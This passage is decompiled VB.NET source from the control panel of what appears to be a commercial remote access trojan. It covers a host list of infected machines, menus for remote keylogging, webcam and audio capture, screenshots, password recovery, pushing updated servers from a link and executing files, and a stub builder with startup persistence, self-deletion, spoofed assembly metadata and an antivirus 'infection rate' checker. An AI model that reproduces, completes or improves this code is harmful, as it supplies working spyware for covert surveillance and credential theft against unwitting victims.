                Me.NetSealtb2.Text = ("Global Message: " & LicenseGlobal.Seal.GlobalMessage.ToString)
                Me.NetSealtb3.Text = ("License Type: " & LicenseGlobal.Seal.LicenseType.ToString)
                Me.NetSealtb4.Text = ("Product Version: " & LicenseGlobal.Seal.ProductVersion.ToString)
                Me.NetSealtb5.Text = ("Username: " & LicenseGlobal.Seal.Username.ToString)
                Me.ListViewNews.Items.Clear
                Dim post As NewsPost
                For Each post In LicenseGlobal.Seal.News
                    Dim item As New ListViewItem(post.Name)
                    item.SubItems.Add(post.Time.ToShortDateString)
                    item.Tag = post.ID
                    Me.ListViewNews.Items.Add(item)
                Next
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox(exception.Message, MsgBoxStyle.Critical, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub Form1_Resize(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.WindowState = FormWindowState.Minimized) Then
                Me.Hide
            End If
        End Sub

        Private Sub FromLinkToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim str3 As String = String.Concat(New String() { Me.listviewmain.SelectedItems.Item(0).SubItems.Item(6).Text, "|", Me.listviewmain.SelectedItems.Item(0).SubItems.Item(1).Text, "@", Me.listviewmain.SelectedItems.Item(0).SubItems.Item(2).Text })
                Dim host As String = str3.Split(New Char() { "|"c })(0)
                Dim file As String = str3.Split(New Char() { "|"c })(1)
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.client.sendcmd(("Uplink|" & Interaction.InputBox("Please provide a direct Link to your updated Server!", "Update Server from Link", "", -1, -1)), host, file), True, False))) Then
                    Interaction.MsgBox("An error has occured !", MsgBoxStyle.Critical, Nothing)
                Else
                    Interaction.MsgBox("Command sent!", MsgBoxStyle.Information, Nothing)
                    Me.client.delete(host, String.Concat(New String() { "*", Me.listviewmain.SelectedItems.Item(0).SubItems.Item(2).Text, "|", Me.listviewmain.SelectedItems.Item(0).SubItems.Item(1).Text, "|", Me.listviewmain.SelectedItems.Item(0).SubItems.Item(0).Text, "|", Me.listviewmain.SelectedItems.Item(0).SubItems.Item(3).Text, "|", Me.listviewmain.SelectedItems.Item(0).SubItems.Item(5).Text, "|", Me.listviewmain.SelectedItems.Item(0).SubItems.Item(4).Text }), file)
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Function GetBetween(ByVal Source As String, ByVal Str1 As String, ByVal Str2 As String, ByVal Optional Index As Integer = 0) As String
            Dim str As String
            Try 
                str = Regex.Split(Regex.Split(Source, Str1)((Index + 1)), Str2)(0)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError
            End Try
            Return str
        End Function

        Public Sub GetScanResults(ByVal x As String)
            Try 
                Dim num As Integer
                Me.Invoke(New Delegateresize(AddressOf Me.rsize), New Object() { Me.Panel2 })
                Me.Invoke(New Delegateresize(AddressOf Me.rsize), New Object() { Me.pb_scan })
                x = x.Replace("\", "")
                x = x.Remove(0, &H72)
                Dim strArray2 As String() = New String(&H25  - 1) {}
                Dim strArray As String() = New String(&H25  - 1) {}
                Dim strArray3 As String() = New String(&H25  - 1) {}
                Me.i = 0
                Do
                    strArray2(Me.i) = x.Split(New Char() { ","c })(Me.i)
                    Me.i += 1
                Loop While (Me.i <= &H24)
                strArray2(&H24) = strArray2(&H24).Remove((strArray2(&H24).Length - 3))
                Dim index As Integer = 0
                Do
                    strArray(index) = strArray2(index).Split(New Char() { ":"c })(0)
                    strArray3(index) = strArray2(index).Split(New Char() { ":"c })(1)
                    index += 1
                Loop While (index <= &H24)
                Dim num3 As Integer = 0
                Do
                    strArray(num3) = Me.GetBetween(strArray(num3), """", """", 0)
                    strArray3(num3) = Me.GetBetween(strArray3(num3), """", """", 0)
                    num3 += 1
                Loop While (num3 <= &H24)
                Dim num4 As Integer = 0
                Do
                    Me.Invoke(New DelegateAdditems(AddressOf Me.additems), New Object() { Me.ListViewScan, strArray(num4) })
                    Me.Invoke(New DelegateAddSubitems(AddressOf Me.addsubitems), New Object() { Me.ListViewScan, strArray3(num4), num4 })
                    num4 += 1
                Loop While (num4 <= &H24)
                Dim num5 As Integer = 0
                Do While (strArray3(num5) <> "OK")
                    num += 1
                    Me.Invoke(New Delegatechangecolor(AddressOf Me.changecolor), New Object() { Me.ListViewScan, num5, Color.Red })
                Label_023B:
                    num5 += 1
                    If (num5 <= &H24) Then
                        Continue Do
                    End If
                    goto Label_02A5
                Label_0249:
                    Me.Invoke(New Delegatechangecolor(AddressOf Me.changecolor), New Object() { Me.ListViewScan, num5, Color.Green })
                    goto Label_023B
                Loop
                goto Label_0249
            Label_02A5:
                Me.Invoke(New DelegateWriteText(AddressOf Me.writetext), New Object() { Me.FlatStatusBar1, ("Infection rate: " & Conversions.ToString(num) & "/37") })
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Public Function Gettime() As Object
            Return String.Concat(New String() { "[", Conversions.ToString(MyProject.Computer.Clock.LocalTime.Hour), ":", Conversions.ToString(MyProject.Computer.Clock.LocalTime.Minute), ":", Conversions.ToString(MyProject.Computer.Clock.LocalTime.Second), "]" })
        End Function

        Public Sub GroupListView(ByVal lstV As ListView, ByVal SubItemIndex As Short)
            Try 
                Dim enumerator As IEnumerator
                Dim flag As Boolean = True
                Try 
                    enumerator = lstV.Items.GetEnumerator
                    Do While enumerator.MoveNext
                        Dim enumerator2 As IEnumerator
                        Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                        Dim text As String = current.SubItems.Item(SubItemIndex).Text
                        Try 
                            enumerator2 = lstV.Groups.GetEnumerator
                            Do While enumerator2.MoveNext
                                Dim group As ListViewGroup = DirectCast(enumerator2.Current, ListViewGroup)
                                If (group.Name = [text]) Then
                                    current.Group = group
                                    flag = False
                                End If
                            Loop
                        Finally
                            If TypeOf enumerator2 Is IDisposable Then
                                TryCast(enumerator2,IDisposable).Dispose
                            End If
                        End Try
                        If flag Then
                            Dim group2 As New ListViewGroup([text], [text])
                            lstV.Groups.Add(group2)
                            current.Group = group2
                        End If
                        flag = True
                    Loop
                Finally
                    If TypeOf enumerator Is IDisposable Then
                        TryCast(enumerator,IDisposable).Dispose
                    End If
                End Try
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox(exception.Message, MsgBoxStyle.Critical, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub HostToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Me.GroupListView(Me.listviewmain, 6)
            Me.groupparameter = 6
        End Sub

        <DebuggerStepThrough> _
        Private Sub InitializeComponent()
            Me.components = New Container
            Dim manager As New ComponentResourceManager(GetType(Form1))
            Me.countryflags = New ImageList(Me.components)
            Me.updateserver = New Timer(Me.components)
            Me.rightclick = New ContextMenuStrip(Me.components)
            Me.PingToolStripMenuItem = New ToolStripMenuItem
            Me.CountryToolStripMenuItem = New ToolStripMenuItem
            Me.HostToolStripMenuItem = New ToolStripMenuItem
            Me.PrivilegsToolStripMenuItem = New ToolStripMenuItem
            Me.OSToolStripMenuItem = New ToolStripMenuItem
            Me.SystemInformationToolStripMenuItem = New ToolStripMenuItem
            Me.SurveillanceToolStripMenuItem = New ToolStripMenuItem
            Me.RemoteScreenshotToolStripMenuItem = New ToolStripMenuItem
            Me.RemoteKeyloggerToolStripMenuItem = New ToolStripMenuItem
            Me.AudioCaptureToolStripMenuItem = New ToolStripMenuItem
            Me.WebcamToolStripMenuItem = New ToolStripMenuItem
            Me.PasswordRecoveryToolStripMenuItem = New ToolStripMenuItem
            Me.ServerOptionsToolStripMenuItem = New ToolStripMenuItem
            Me.UpdateServerToolStripMenuItem = New ToolStripMenuItem
            Me.FromLinkToolStripMenuItem = New ToolStripMenuItem
            Me.ExecuteFileToolStripMenuItem = New ToolStripMenuItem
            Me.UninstallToolStripMenuItem = New ToolStripMenuItem
            Me.RestartToolStripMenuItem1 = New ToolStripMenuItem
            Me.MiscellaneousToolStripMenuItem = New ToolStripMenuItem
            Me.MapViewToolStripMenuItem = New ToolStripMenuItem
            Me.STRESSTesterToolStripMenuItem = New ToolStripMenuItem
            Me.Notify = New NotifyIcon(Me.components)
            Me.notifyrightclick = New ContextMenuStrip(Me.components)
            Me.ShowToolStripMenuItem = New ToolStripMenuItem
            Me.ExitToolStripMenuItem = New ToolStripMenuItem
            Me.ContextDeleteHosts = New ContextMenuStrip(Me.components)
            Me.ToolStripMenuItem1 = New ToolStripMenuItem
            Me.DeleteToolStripMenuItem = New ToolStripMenuItem
            Me.FormSkin1 = New FormSkin
            Me.Labelstubinfo = New Label
            Me.FlatStatusBar1 = New FlatStatusBar
            Me.ListView1 = New ListView
            Me.ColumnHeader1 = New ColumnHeader
            Me.ColumnHeader2 = New ColumnHeader
            Me.ColumnHeader3 = New ColumnHeader
            Me.ColumnHeader4 = New ColumnHeader
            Me.ColumnHeader5 = New ColumnHeader
            Me.ColumnHeader6 = New ColumnHeader
            Me.ColumnHeader7 = New ColumnHeader
            Me.TabControl1 = New FlatTabControl
            Me.PageMain = New TabPage
            Me.listviewmain = New ListView
            Me.location = New ColumnHeader
            Me.user = New ColumnHeader
            Me.ip = New ColumnHeader
            Me.os = New ColumnHeader
            Me.ver = New ColumnHeader
            Me.priv = New ColumnHeader
            Me.server = New ColumnHeader
            Me.PageBuilder = New TabPage
            Me.DotNetBarTabcontrol1 = New DotNetBarTabcontrol
            Me.TabPage1 = New TabPage
            Me.FlatGroupBox6 = New FlatGroupBox
            Me.Panel1 = New Panel
            Me.rb_appdata = New RadioButton
            Me.rb_temp = New RadioButton
            Me.cb_hklm = New RadioButton
            Me.cb_hkcu = New RadioButton
            Me.tb_install_path = New FlatTextBox
            Me.cb_melt = New FlatCheckBox
            Me.cb_install = New FlatCheckBox
            Me.cb_install_enable = New FlatCheckBox
            Me.FlatGroupBox5 = New FlatGroupBox
            Me.tb_host = New FlatComboBox
            Me.FlatLabel3 = New FlatLabel
            Me.FlatGroupBox4 = New FlatGroupBox
            Me.btn_load_settings = New FlatButton
            Me.TabPage2 = New TabPage
            Me.btn_generate = New FlatButton
            Me.FlatLabel8 = New FlatLabel
            Me.FlatLabel9 = New FlatLabel
            Me.FlatLabel10 = New FlatLabel
            Me.FlatLabel11 = New FlatLabel
            Me.tb_assemblytrademark = New FlatTextBox
            Me.tb_assemblyversion = New FlatTextBox
            Me.tb_assemblyfileversion = New FlatTextBox
            Me.tb_assemblycopyright = New FlatTextBox
            Me.FlatLabel7 = New FlatLabel
            Me.FlatLabel6 = New FlatLabel
            Me.FlatLabel5 = New FlatLabel
            Me.FlatLabel4 = New FlatLabel
            Me.tb_assemblydescription = New FlatTextBox
            Me.tb_assemblycompany = New FlatTextBox
            Me.tb_assemblyproduct = New FlatTextBox
            Me.tb_assemblytitle = New FlatTextBox
            Me.TabPage3 = New TabPage
            Me.FlatGroupBox8 = New FlatGroupBox
            Me.cb_savesettings = New FlatCheckBox
            Me.ProgressBar1 = New FlatProgressBar
            Me.btn_build = New FlatButton
            Me.rtb_output = New RichTextBox
            Me.FlatGroupBox7 = New FlatGroupBox
            Me.cb_icon = New FlatCheckBox
            Me.btn_selecticn = New FlatStickyButton
            Me.PictureBox_Icon = New PictureBox
            Me.TabPage4 = New TabPage
            Me.Panel2 = New Panel
            Me.pb_scan = New PictureBox
            Me.ListViewScan = New ListView
            Me.avs = New ColumnHeader
            Me.scans = New ColumnHeader
            Me.FlatLabel20 = New FlatLabel
            Me.PageSettings = New TabPage
            Me.DotNetBarTabcontrol2 = New DotNetBarTabcontrol
            Me.TabPage5 = New TabPage
            Me.FlatGroupBox2 = New FlatGroupBox
            Me.cb_sc = New FlatCheckBox
            Me.cb_ac = New FlatCheckBox
            Me.cb_sound = New FlatCheckBox
            Me.cb_notify = New FlatCheckBox
            Me.FlatGroupBox1 = New FlatGroupBox
            Me.boxhosts = New FlatListBox
            Me.TabPage6 = New TabPage
            Me.FlatGroupBox3 = New FlatGroupBox
            Me.tb_runfile = New FlatTextBox
            Me.FlatLabel2 = New FlatLabel
            Me.toggledownload = New FlatToggle
            Me.tb_web = New FlatTextBox
            Me.toggleweb = New FlatToggle
            Me.FlatLabel1 = New FlatLabel
            Me.TabPage7 = New TabPage
            Me.LinkLabel1 = New LinkLabel
            Me.FlatLabel12 = New FlatLabel
            Me.PictureBox1 = New PictureBox
            Me.TabPage8 = New TabPage
            Me.FlatGroupBox10 = New FlatGroupBox
            Me.FlatLabel21 = New FlatLabel
            Me.FlatLabel19 = New FlatLabel
            Me.FlatLabel18 = New FlatLabel
            Me.FlatLabel17 = New FlatLabel
            Me.FlatLabel16 = New FlatLabel
            Me.FlatLabel15 = New FlatLabel
            Me.FlatLabel14 = New FlatLabel
            Me.FlatLabel13 = New FlatLabel
            Me.TabPage9 = New TabPage
            Me.FlatGroupBox11 = New FlatGroupBox
            Me.Opennsbtn = New FlatStickyButton
            Me.NetSealtb5 = New FlatLabel
            Me.NetSealtb4 = New FlatLabel
            Me.NetSealtb3 = New FlatLabel
            Me.NetSealtb2 = New FlatLabel
            Me.NetSealtb1 = New FlatLabel
            Me.PageNews = New TabPage
            Me.rtbnews = New RichTextBox
            Me.ListViewNews = New ListView
            Me.title = New ColumnHeader
            Me.time = New ColumnHeader
            Me.MaxButton = New FlatMax
            Me.MiniButton = New FlatMini
            Me.CloseButton = New FlatClose
            Me.MenuStrip1 = New MenuStrip
            Me.ConnectionToolStripMenuItem = New ToolStripMenuItem
            Me.ConnectToolStripMenuItem = New ToolStripMenuItem
            Me.ConnectToAllToolStripMenuItem = New ToolStripMenuItem
            Me.DisconnectToolStripMenuItem = New ToolStripMenuItem
            Me.AddNewToolStripMenuItem = New ToolStripMenuItem
            Me.rightclick.SuspendLayout
            Me.notifyrightclick.SuspendLayout
            Me.ContextDeleteHosts.SuspendLayout
            Me.FormSkin1.SuspendLayout
            Me.TabControl1.SuspendLayout
            Me.PageMain.SuspendLayout
            Me.PageBuilder.SuspendLayout
            Me.DotNetBarTabcontrol1.SuspendLayout
            Me.TabPage1.SuspendLayout
            Me.FlatGroupBox6.SuspendLayout
            Me.Panel1.SuspendLayout
            Me.FlatGroupBox5.SuspendLayout
            Me.FlatGroupBox4.SuspendLayout
            Me.TabPage2.SuspendLayout
            Me.TabPage3.SuspendLayout
            Me.FlatGroupBox8.SuspendLayout
            Me.FlatGroupBox7.SuspendLayout
            DirectCast(Me.PictureBox_Icon, ISupportInitialize).BeginInit
            Me.TabPage4.SuspendLayout
            Me.Panel2.SuspendLayout
            DirectCast(Me.pb_scan, ISupportInitialize).BeginInit
            Me.PageSettings.SuspendLayout
            Me.DotNetBarTabcontrol2.SuspendLayout
            Me.TabPage5.SuspendLayout
            Me.FlatGroupBox2.SuspendLayout
            Me.FlatGroupBox1.SuspendLayout
            Me.TabPage6.SuspendLayout
            Me.FlatGroupBox3.SuspendLayout
            Me.TabPage7.SuspendLayout
            DirectCast(Me.PictureBox1, ISupportInitialize).BeginInit
            Me.TabPage8.SuspendLayout
            Me.FlatGroupBox10.SuspendLayout
            Me.TabPage9.SuspendLayout
            Me.FlatGroupBox11.SuspendLayout
            Me.PageNews.SuspendLayout
            Me.MenuStrip1.SuspendLayout
            Me.SuspendLayout
            Me.countryflags.ImageStream = DirectCast(manager.GetObject("countryflags.ImageStream"), ImageListStreamer)
            Me.countryflags.TransparentColor = Color.Transparent
            Me.countryflags.Images.SetKeyName(0, "ad.png")
            Me.countryflags.Images.SetKeyName(1, "ae.png")
            Me.countryflags.Images.SetKeyName(2, "af.png")
            Me.countryflags.Images.SetKeyName(3, "ag.png")
            Me.countryflags.Images.SetKeyName(4, "ai.png")
            Me.countryflags.Images.SetKeyName(5, "al.png")
            Me.countryflags.Images.SetKeyName(6, "am.png")
            Me.countryflags.Images.SetKeyName(7, "an.png")
            Me.countryflags.Images.SetKeyName(8, "ao.png")
            Me.countryflags.Images.SetKeyName(9, "ar.png")
            Me.countryflags.Images.SetKeyName(10, "as.png")
            Me.countryflags.Images.SetKeyName(11, "at.png")
            Me.countryflags.Images.SetKeyName(12, "au.png")
            Me.countryflags.Images.SetKeyName(13, "aw.png")
            Me.countryflags.Images.SetKeyName(14, "ax.png")
            Me.countryflags.Images.SetKeyName(15, "az.png")
            Me.countryflags.Images.SetKeyName(&H10, "ba.png")
            Me.countryflags.Images.SetKeyName(&H11, "bb.png")
            Me.countryflags.Images.SetKeyName(&H12, "bd.png")
            Me.countryflags.Images.SetKeyName(&H13, "be.png")
            Me.countryflags.Images.SetKeyName(20, "bf.png")
            Me.countryflags.Images.SetKeyName(&H15, "bg.png")
            Me.countryflags.Images.SetKeyName(&H16, "bh.png")
            Me.countryflags.Images.SetKeyName(&H17, "bi.png")
            Me.countryflags.Images.SetKeyName(&H18, "bj.png")
            Me.countryflags.Images.SetKeyName(&H19, "bm.png")
            Me.countryflags.Images.SetKeyName(&H1A, "bn.png")
            Me.countryflags.Images.SetKeyName(&H1B, "bo.png")
            Me.countryflags.Images.SetKeyName(&H1C, "br.png")
            Me.countryflags.Images.SetKeyName(&H1D, "bs.png")
            Me.countryflags.Images.SetKeyName(30, "bt.png")
            Me.countryflags.Images.SetKeyName(&H1F, "bv.png")
            Me.countryflags.Images.SetKeyName(&H20, "bw.png")
            Me.countryflags.Images.SetKeyName(&H21, "by.png")
            Me.countryflags.Images.SetKeyName(&H22, "bz.png")
            Me.countryflags.Images.SetKeyName(&H23, "ca.png")
            Me.countryflags.Images.SetKeyName(&H24, "catalonia.png")
            Me.countryflags.Images.SetKeyName(&H25, "cc.png")
            Me.countryflags.Images.SetKeyName(&H26, "cd.png")
            Me.countryflags.Images.SetKeyName(&H27, "cf.png")
            Me.countryflags.Images.SetKeyName(40, "cg.png")
            Me.countryflags.Images.SetKeyName(&H29, "ch.png")
            Me.countryflags.Images.SetKeyName(&H2A, "ci.png")
            Me.countryflags.Images.SetKeyName(&H2B, "ck.png")
            Me.countryflags.Images.SetKeyName(&H2C, "cl.png")
            Me.countryflags.Images.SetKeyName(&H2D, "cm.png")
            Me.countryflags.Images.SetKeyName(&H2E, "cn.png")
            Me.countryflags.Images.SetKeyName(&H2F, "co.png")
            Me.countryflags.Images.SetKeyName(&H30, "cr.png")
            Me.countryflags.Images.SetKeyName(&H31, "cs.png")
            Me.countryflags.Images.SetKeyName(50, "cu.png")
            Me.countryflags.Images.SetKeyName(&H33, "cv.png")
            Me.countryflags.Images.SetKeyName(&H34, "cx.png")
            Me.countryflags.Images.SetKeyName(&H35, "cy.png")
            Me.countryflags.Images.SetKeyName(&H36, "cz.png")
            Me.countryflags.Images.SetKeyName(&H37, "de.png")
            Me.countryflags.Images.SetKeyName(&H38, "dj.png")
            Me.countryflags.Images.SetKeyName(&H39, "dk.png")
            Me.countryflags.Images.SetKeyName(&H3A, "dm.png")
            Me.countryflags.Images.SetKeyName(&H3B, "do.png")
            Me.countryflags.Images.SetKeyName(60, "dz.png")
            Me.countryflags.Images.SetKeyName(&H3D, "ec.png")
            Me.countryflags.Images.SetKeyName(&H3E, "ee.png")
            Me.countryflags.Images.SetKeyName(&H3F, "eg.png")
            Me.countryflags.Images.SetKeyName(&H40, "eh.png")
            Me.countryflags.Images.SetKeyName(&H41, "england.png")
            Me.countryflags.Images.SetKeyName(&H42, "er.png")
            Me.countryflags.Images.SetKeyName(&H43, "es.png")
            Me.countryflags.Images.SetKeyName(&H44, "et.png")
            Me.countryflags.Images.SetKeyName(&H45, "europeanunion.png")
            Me.countryflags.Images.SetKeyName(70, "fam.png")
            Me.countryflags.Images.SetKeyName(&H47, "fi.png")
            Me.countryflags.Images.SetKeyName(&H48, "fj.png")
            Me.countryflags.Images.SetKeyName(&H49, "fk.png")
            Me.countryflags.Images.SetKeyName(&H4A, "fm.png")
            Me.countryflags.Images.SetKeyName(&H4B, "fo.png")
            Me.countryflags.Images.SetKeyName(&H4C, "fr.png")
            Me.countryflags.Images.SetKeyName(&H4D, "ga.png")
            Me.countryflags.Images.SetKeyName(&H4E, "gb.png")
            Me.countryflags.Images.SetKeyName(&H4F, "gd.png")
            Me.countryflags.Images.SetKeyName(80, "ge.png")
            Me.countryflags.Images.SetKeyName(&H51, "gf.png")
            Me.countryflags.Images.SetKeyName(&H52, "gh.png")
            Me.countryflags.Images.SetKeyName(&H53, "gi.png")
            Me.countryflags.Images.SetKeyName(&H54, "gl.png")
            Me.countryflags.Images.SetKeyName(&H55, "gm.png")
            Me.countryflags.Images.SetKeyName(&H56, "gn.png")
            Me.countryflags.Images.SetKeyName(&H57, "gp.png")
            Me.countryflags.Images.SetKeyName(&H58, "gq.png")
            Me.countryflags.Images.SetKeyName(&H59, "gr.png")
            Me.countryflags.Images.SetKeyName(90, "gs.png")
            Me.countryflags.Images.SetKeyName(&H5B, "gt.png")
            Me.countryflags.Images.SetKeyName(&H5C, "gu.png")
            Me.countryflags.Images.SetKeyName(&H5D, "gw.png")
            Me.countryflags.Images.SetKeyName(&H5E, "gy.png")
            Me.countryflags.Images.SetKeyName(&H5F, "hk.png")
            Me.countryflags.Images.SetKeyName(&H60, "hm.png")
            Me.countryflags.Images.SetKeyName(&H61, "hn.png")
            Me.countryflags.Images.SetKeyName(&H62, "hr.png")
            Me.countryflags.Images.SetKeyName(&H63, "ht.png")
            Me.countryflags.Images.SetKeyName(100, "hu.png")
            Me.countryflags.Images.SetKeyName(&H65, "id.png")
            Me.countryflags.Images.SetKeyName(&H66, "ie.png")
            Me.countryflags.Images.SetKeyName(&H67, "il.png")
            Me.countryflags.Images.SetKeyName(&H68, "in.png")
            Me.countryflags.Images.SetKeyName(&H69, "io.png")
            Me.countryflags.Images.SetKeyName(&H6A, "iq.png")
            Me.countryflags.Images.SetKeyName(&H6B, "ir.png")
            Me.countryflags.Images.SetKeyName(&H6C, "is.png")
            Me.countryflags.Images.SetKeyName(&H6D, "it.png")
            Me.countryflags.Images.SetKeyName(110, "jm.png")
            Me.countryflags.Images.SetKeyName(&H6F, "jo.png")
            Me.countryflags.Images.SetKeyName(&H70, "jp.png")
            Me.countryflags.Images.SetKeyName(&H71, "ke.png")
            Me.countryflags.Images.SetKeyName(&H72, "kg.png")
            Me.countryflags.Images.SetKeyName(&H73, "kh.png")
            Me.countryflags.Images.SetKeyName(&H74, "ki.png")
            Me.countryflags.Images.SetKeyName(&H75, "km.png")
            Me.countryflags.Images.SetKeyName(&H76, "kn.png")
            Me.countryflags.Images.SetKeyName(&H77, "kp.png")
            Me.countryflags.Images.SetKeyName(120, "kr.png")
            Me.countryflags.Images.SetKeyName(&H79, "kw.png")
            Me.countryflags.Images.SetKeyName(&H7A, "ky.png")
            Me.countryflags.Images.SetKeyName(&H7B, "kz.png")
            Me.countryflags.Images.SetKeyName(&H7C, "la.png")
            Me.countryflags.Images.SetKeyName(&H7D, "lb.png")
            Me.countryflags.Images.SetKeyName(&H7E, "lc.png")
            Me.countryflags.Images.SetKeyName(&H7F, "li.png")
            Me.countryflags.Images.SetKeyName(&H80, "lk.png")
            Me.countryflags.Images.SetKeyName(&H81, "lr.png")
            Me.countryflags.Images.SetKeyName(130, "ls.png")
            Me.countryflags.Images.SetKeyName(&H83, "lt.png")
            Me.countryflags.Images.SetKeyName(&H84, "lu.png")
            Me.countryflags.Images.SetKeyName(&H85, "lv.png")
            Me.countryflags.Images.SetKeyName(&H86, "ly.png")
            Me.countryflags.Images.SetKeyName(&H87, "ma.png")
            Me.countryflags.Images.SetKeyName(&H88, "mc.png")
            Me.countryflags.Images.SetKeyName(&H89, "md.png")
            Me.countryflags.Images.SetKeyName(&H8A, "me.png")
            Me.countryflags.Images.SetKeyName(&H8B, "mg.png")
            Me.countryflags.Images.SetKeyName(140, "mh.png")
            Me.countryflags.Images.SetKeyName(&H8D, "mk.png")
            Me.countryflags.Images.SetKeyName(&H8E, "ml.png")
            Me.countryflags.Images.SetKeyName(&H8F, "mm.png")
            Me.countryflags.Images.SetKeyName(&H90, "mn.png")
            Me.countryflags.Images.SetKeyName(&H91, "mo.png")
            Me.countryflags.Images.SetKeyName(&H92, "mp.png")
            Me.countryflags.Images.SetKeyName(&H93, "mq.png")
            Me.countryflags.Images.SetKeyName(&H94, "mr.png")
            Me.countryflags.Images.SetKeyName(&H95, "ms.png")
            Me.countryflags.Images.SetKeyName(150, "mt.png")
            Me.countryflags.Images.SetKeyName(&H97, "mu.png")
            Me.countryflags.Images.SetKeyName(&H98, "mv.png")
            Me.countryflags.Images.SetKeyName(&H99, "mw.png")
            Me.countryflags.Images.SetKeyName(&H9A, "mx.png")
            Me.countryflags.Images.SetKeyName(&H9B, "my.png")
            Me.countryflags.Images.SetKeyName(&H9C, "mz.png")
            Me.countryflags.Images.SetKeyName(&H9D, "na.png")
            Me.countryflags.Images.SetKeyName(&H9E, "nc.png")
            Me.countryflags.Images.SetKeyName(&H9F, "ne.png")
            Me.countryflags.Images.SetKeyName(160, "nf.png")
            Me.countryflags.Images.SetKeyName(&HA1, "ng.png")
            Me.countryflags.Images.SetKeyName(&HA2, "ni.png")
            Me.countryflags.Images.SetKeyName(&HA3, "nl.png")
            Me.countryflags.Images.SetKeyName(&HA4, "no.png")
            Me.countryflags.Images.SetKeyName(&HA5, "np.png")
            Me.countryflags.Images.SetKeyName(&HA6, "nr.png")
            Me.countryflags.Images.SetKeyName(&HA7, "nu.png")
            Me.countryflags.Images.SetKeyName(&HA8, "nz.png")
            Me.countryflags.Images.SetKeyName(&HA9, "om.png")
            Me.countryflags.Images.SetKeyName(170, "pa.png")
            Me.countryflags.Images.SetKeyName(&HAB, "pe.png")
            Me.countryflags.Images.SetKeyName(&HAC, "pf.png")
            Me.countryflags.Images.SetKeyName(&HAD, "pg.png")
            Me.countryflags.Images.SetKeyName(&HAE, "ph.png")
            Me.countryflags.Images.SetKeyName(&HAF, "pk.png")
            Me.countryflags.Images.SetKeyName(&HB0, "pl.png")
            Me.countryflags.Images.SetKeyName(&HB1, "pm.png")
            Me.countryflags.Images.SetKeyName(&HB2, "pn.png")
            Me.countryflags.Images.SetKeyName(&HB3, "pr.png")
            Me.countryflags.Images.SetKeyName(180, "ps.png")
            Me.countryflags.Images.SetKeyName(&HB5, "pt.png")
            Me.countryflags.Images.SetKeyName(&HB6, "pw.png")
            Me.countryflags.Images.SetKeyName(&HB7, "py.png")
            Me.countryflags.Images.SetKeyName(&HB8, "qa.png")
            Me.countryflags.Images.SetKeyName(&HB9, "re.png")
            Me.countryflags.Images.SetKeyName(&HBA, "ro.png")
            Me.countryflags.Images.SetKeyName(&HBB, "rs.png")
            Me.countryflags.Images.SetKeyName(&HBC, "ru.png")
            Me.countryflags.Images.SetKeyName(&HBD, "rw.png")
            Me.countryflags.Images.SetKeyName(190, "sa.png")
            Me.countryflags.Images.SetKeyName(&HBF, "sb.png")
            Me.countryflags.Images.SetKeyName(&HC0, "sc.png")
            Me.countryflags.Images.SetKeyName(&HC1, "scotland.png")
            Me.countryflags.Images.SetKeyName(&HC2, "sd.png")
            Me.countryflags.Images.SetKeyName(&HC3, "se.png")
            Me.countryflags.Images.SetKeyName(&HC4, "sg.png")
            Me.countryflags.Images.SetKeyName(&HC5, "sh.png")
            Me.countryflags.Images.SetKeyName(&HC6, "si.png")
            Me.countryflags.Images.SetKeyName(&HC7, "sj.png")
            Me.countryflags.Images.SetKeyName(200, "sk.png")
            Me.countryflags.Images.SetKeyName(&HC9, "sl.png")
            Me.countryflags.Images.SetKeyName(&HCA, "sm.png")
            Me.countryflags.Images.SetKeyName(&HCB, "sn.png")
            Me.countryflags.Images.SetKeyName(&HCC, "so.png")
            Me.countryflags.Images.SetKeyName(&HCD, "sr.png")
            Me.countryflags.Images.SetKeyName(&HCE, "st.png")
            Me.countryflags.Images.SetKeyName(&HCF, "sv.png")
            Me.countryflags.Images.SetKeyName(&HD0, "sy.png")
            Me.countryflags.Images.SetKeyName(&HD1, "sz.png")
            Me.countryflags.Images.SetKeyName(210, "tc.png")
            Me.countryflags.Images.SetKeyName(&HD3, "td.png")
            Me.countryflags.Images.SetKeyName(&HD4, "tf.png")
            Me.countryflags.Images.SetKeyName(&HD5, "tg.png")
            Me.countryflags.Images.SetKeyName(&HD6, "th.png")
            Me.countryflags.Images.SetKeyName(&HD7, "tj.png")
            Me.countryflags.Images.SetKeyName(&HD8, "tk.png")
            Me.countryflags.Images.SetKeyName(&HD9, "tl.png")
            Me.countryflags.Images.SetKeyName(&HDA, "tm.png")
            Me.countryflags.Images.SetKeyName(&HDB, "tn.png")
            Me.countryflags.Images.SetKeyName(220, "to.png")
            Me.countryflags.Images.SetKeyName(&HDD, "tr.png")
            Me.countryflags.Images.SetKeyName(&HDE, "tt.png")
            Me.countryflags.Images.SetKeyName(&HDF, "tv.png")
            Me.countryflags.Images.SetKeyName(&HE0, "tw.png")
            Me.countryflags.Images.SetKeyName(&HE1, "tz.png")
            Me.countryflags.Images.SetKeyName(&HE2, "ua.png")
            Me.countryflags.Images.SetKeyName(&HE3, "ug.png")
            Me.countryflags.Images.SetKeyName(&HE4, "um.png")
            Me.countryflags.Images.SetKeyName(&HE5, "us.png")
            Me.countryflags.Images.SetKeyName(230, "uy.png")
            Me.countryflags.Images.SetKeyName(&HE7, "uz.png")
            Me.countryflags.Images.SetKeyName(&HE8, "va.png")
            Me.countryflags.Images.SetKeyName(&HE9, "vc.png")
            Me.countryflags.Images.SetKeyName(&HEA, "ve.png")
            Me.countryflags.Images.SetKeyName(&HEB, "vg.png")
